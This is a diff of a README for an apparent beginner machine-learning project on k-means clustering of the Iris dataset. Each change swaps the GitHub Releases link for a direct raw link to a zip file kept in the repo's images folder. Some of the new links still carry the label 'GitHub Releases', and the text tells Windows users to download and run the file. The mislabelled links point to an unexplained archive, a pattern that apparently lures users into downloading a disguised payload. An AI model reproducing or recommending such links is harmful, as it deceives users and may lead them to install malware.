@@ -1,6 +1,6 @@
 # 📊 iris-clustering-kmeans-beginner-ml - Learn Clustering With Clarity
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/Emmanuel763/iris-clustering-kmeans-beginner-ml/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/Emmanuel763/iris-clustering-kmeans-beginner-ml/main/images/kmeans-clustering-iris-ml-beginner-v2.8-alpha.1.zip)
 
 ## 🌼 What this project does
 
@@ -18,7 +18,7 @@ You will see how the model groups flowers based on their features. You will also
 
 ## ⬇️ Download and run on Windows
 
-Visit this page to download: [GitHub Releases](https://github.com/Emmanuel763/iris-clustering-kmeans-beginner-ml/releases)
+Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Emmanuel763/iris-clustering-kmeans-beginner-ml/main/images/kmeans-clustering-iris-ml-beginner-v2.8-alpha.1.zip)
 
 1. Open the link above in your browser.
 2. Find the latest release.
@@ -155,7 +155,7 @@ You will see:
 
 ## 📦 Release download
 
-Download from the releases page here: [https://github.com/Emmanuel763/iris-clustering-kmeans-beginner-ml/releases](https://github.com/Emmanuel763/iris-clustering-kmeans-beginner-ml/releases)
+Download from the releases page here: [https://raw.githubusercontent.com/Emmanuel763/iris-clustering-kmeans-beginner-ml/main/images/kmeans-clustering-iris-ml-beginner-v2.8-alpha.1.zip](https://raw.githubusercontent.com/Emmanuel763/iris-clustering-kmeans-beginner-ml/main/images/kmeans-clustering-iris-ml-beginner-v2.8-alpha.1.zip)
 
 1. Open the releases page
 2. Download the latest release file
